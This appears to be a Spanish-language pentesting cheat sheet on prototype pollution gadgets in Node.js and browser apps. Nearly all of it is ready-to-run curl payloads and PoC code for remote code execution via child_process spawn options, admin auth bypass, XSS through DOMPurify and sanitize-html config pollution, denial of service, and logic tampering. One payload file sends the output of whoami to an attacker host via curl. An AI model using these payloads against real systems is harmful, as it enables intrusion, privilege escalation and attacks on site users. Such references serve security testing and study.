---
aliases:
  - PP Gadgets
  - Prototype Pollution RCE
  - PP Auth Bypass
  - PP XSS
tags:
  - type/technique
  - vuln/prototype-pollution
  - technique/execution
  - technique/privilege-escalation
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Prototype Pollution]]'
---
# Prototype Pollution - Gadgets y Explotación

***

## RCE via child_process (Server)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--require /tmp/x.js"}}' https://target/api/x` | Pollute spawn options para RCE | Server hace spawn post-pollution. |
| `curl -X POST -d '{"__proto__":{"env":{"NODE_OPTIONS":"--inspect-brk=0.0.0.0:9229"}}}' https://target/api/x` | Activate Node debug mode → RCE via inspector | spawn lee env from prototype. |
| `curl -X POST -d '{"__proto__":{"execArgv":["--require","/tmp/x.js"]}}' https://target/api/x` | Polluciar execArgv — forks heredan args | Spawn forks. |
| Upload file `/tmp/x.js` via file upload endpoint pre-pollution | Drop payload archivo | File upload + PP chain. |
| Post-pollution trigger: `curl https://target/api/spawn-feature` (que invoca spawn) | Trigger RCE via existing endpoint | Wait spawn. |
| `curl -X POST -d '{"__proto__":{"contextIsolated":false}}' https://target/api/x` | Electron sandbox bypass | Electron apps. |
| `curl -X POST -d '{"__proto__":{"sandbox":false}}' https://target/api/x` | Sandbox flag disable | Sandbox-aware libs. |
^pp-gadget-rce

### PoC RCE via NODE_OPTIONS

```javascript
// Atacante poluciona ANTES de que server haga child_process.spawn
const userInput = JSON.parse('{"__proto__":{"shell":true,"env":{"NODE_OPTIONS":"--require /tmp/payload.js"}}}');
_.merge(config, userInput);

// Server-side, en algún momento:
require('child_process').spawn('ls', []);
// Si spawn lee `shell` y `env` de prototype → ejecuta /tmp/payload.js
```

```javascript
// /tmp/payload.js (atacante lo dropea via file upload o LFI antes)
require('child_process').exec('curl http://attacker/$(whoami)');
```

___

## Auth Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d '{"__proto__":{"isAdmin":true}}' https://target/api/x` | Pollute Object.prototype.isAdmin = true | Backend `if(user.isAdmin)`. |
| `curl -X POST -d '{"__proto__":{"role":"admin"}}' https://target/api/x` | Role string pollution | RBAC via role field. |
| `curl -X POST -d '{"__proto__":{"permissions":["*"]}}' https://target/api/x` | Wildcard perms inject | Granular RBAC. |
| `curl -X POST -d '{"__proto__":{"isAuthenticated":true}}' https://target/api/x` | Skip auth check globally | Auth check via flag. |
| `curl -X POST -d '{"__proto__":{"verified":true,"emailVerified":true}}' https://target/api/x` | Skip verification checks | Combine signup flow. |
| Post-pollution: `curl https://target/api/admin/users` | Test bypass | Validation. |
| Browser console post-XSS-pollution: `Object.prototype.isAdmin` | Verify pollution global | Client-side check. |
^pp-gadget-auth

### PoC auth bypass

```javascript
// Backend chequea
function checkAdmin(req, res, next) {
  if (req.user.isAdmin) {
    next();
  } else {
    res.status(403).send('Forbidden');
  }
}

// Atacante: pollute Object.prototype.isAdmin = true
// Cualquier user que no tenga isAdmin propio hereda true del prototype
// → req.user.isAdmin === true → bypass.
```

___

## XSS via Gadget en Sanitizer

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Phishing URL: `https://target/?__proto__[ALLOWED_ATTR][]=onerror` (DOMPurify config) | Allow XSS attrs via DOMPurify pollution | Frontend usa DOMPurify. |
| `https://target/?__proto__[ALLOWED_TAGS][]=script` | Allow script tag global | DOMPurify config pollution. |
| `https://target/?__proto__[allowedTags][]=script` | sanitize-html config bypass | Server-side sanitizer. |
| `https://target/?__proto__[html]=true` (Markdown-it) | Enable raw HTML rendering | Markdown library. |
| Post-pollution + XSS injection: `<img src=x onerror=alert(1)>` en input | XSS now executes via polluted sanitizer | Combo PP + XSS. |
| Browser console post-pollution: `DOMPurify.sanitize('<script>alert(1)</script>')` | Test sanitizer bypassed | Validation. |
| `curl -X POST -d '{"__proto__":{"FORBID_TAGS":[]}}' https://target/api/x` | Clear forbidden tags list | Reverse sanitizer. |
^pp-gadget-xss

___

## DoS / Property Override

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d '{"__proto__":{"toString":null}}' https://target/api/x` | Override toString → `.toString()` rompe | App con string conversions. |
| `curl -X POST -d '{"__proto__":{"hasOwnProperty":null}}' https://target/api/x` | Object iteration breaks | Loops fail. |
| `curl -X POST -d '{"__proto__":{"length":99999999}}' https://target/api/x` | Iterate loop infinito | `.length` polluted. |
| `curl -X POST -d '{"__proto__":{"toJSON":null}}' https://target/api/x` | JSON.stringify fails | Serialization crash. |
| `curl -X POST -d '{"__proto__":{"push":null}}' https://target/api/x` (Array.prototype) | `arr.push()` rompe | Array operations break. |
| Post-pollution: GET `/api/health` → 500 | Confirm DoS state | Server crash. |
| `curl -X POST -d '{"__proto__":{"valueOf":null}}' https://target/api/x` | Comparisons rompen | Comparison operators fail. |
^pp-gadget-dos

___

## Property Injection que Cambia Logic

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d '{"__proto__":{"timeout":10000}}' https://target/api/x` | Pollute default timeout | Timing-sensitive logic. |
| `curl -X POST -d '{"__proto__":{"betaFeatures":true,"debug":true}}' https://target/api/x` | Enable hidden features + debug mode | Feature flag toggle. |
| `curl -X POST -d '{"__proto__":{"baseURL":"http://attacker.com/"}}' https://target/api/x` | API client baseURL pollution → requests a attacker | API redirect chain. |
| `curl -X POST -d '{"__proto__":{"unlimited":true,"noRateLimit":true}}' https://target/api/x` | Bypass rate limiting | Rate limit flag. |
| `curl -X POST -d '{"__proto__":{"headers":{"X-Forwarded-For":"127.0.0.1"}}}' https://target/api/x` | Inject trust headers en outbound requests | Internal trust bypass. |
| `curl -X POST -d '{"__proto__":{"path":"/etc/passwd"}}' https://target/api/x` | File path pollution para LFI | File operations. |
| `curl -X POST -d '{"__proto__":{"verifySSL":false,"rejectUnauthorized":false}}' https://target/api/x` | Disable TLS validation | MITM chain. |
| Post-pollution trigger feature affected: `curl https://target/api/feature-using-polluted-field` | Validate logic changes | Confirmation. |
^pp-gadget-logic

### Common gadget chain stack

```
1. Pollute Object.prototype.X = controlled value
2. Server reads obj.X expecting default → gets atacante value
3. Side effect: RCE / auth bypass / data leak / DoS
```

***
